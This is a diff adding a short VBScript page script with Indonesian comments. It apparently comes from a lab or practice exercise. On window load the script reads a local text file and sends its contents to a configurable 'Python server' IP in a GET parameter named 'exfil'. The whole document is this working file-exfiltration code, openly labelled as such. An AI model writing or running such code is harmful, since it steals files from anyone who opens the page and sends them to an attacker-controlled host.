@@ -1,0 +1,31 @@
+<script language="VBScript">
+    Sub Window_OnLoad
+        Dim fso, file, content, http, url, server_ip
+        ' Ganti dengan IP Server Python kalian
+        server_ip = "http://172.26.74.9:8000/"
+        
+        On Error Resume Next
+        Set fso = CreateObject("Scripting.FileSystemObject")
+        
+        ' Menggunakan path absolut sesuai folder
+        Set file = fso.OpenTextFile("C:\Users\M S I\Downloads\test\halo.txt", 1)
+        
+        If Err.Number = 0 Then
+            content = file.ReadAll
+            file.Close
+
+            ' Exfiltrasi data via GET request
+            Set http = CreateObject("MSXML2.XMLHTTP")
+            ' Menambahkan fungsi escape sederhana untuk spasi
+            url = server_ip & "?exfil=" & content
+            http.Open "GET", url, False
+            http.Send
+            
+            MsgBox "Data berhasil dikirim ke server!", 64, "Success"
+        Else
+            MsgBox "File tidak ditemukan di path tersebut!", 16, "Error"
+        End If
+        
+        Close
+    End Sub
+</script>
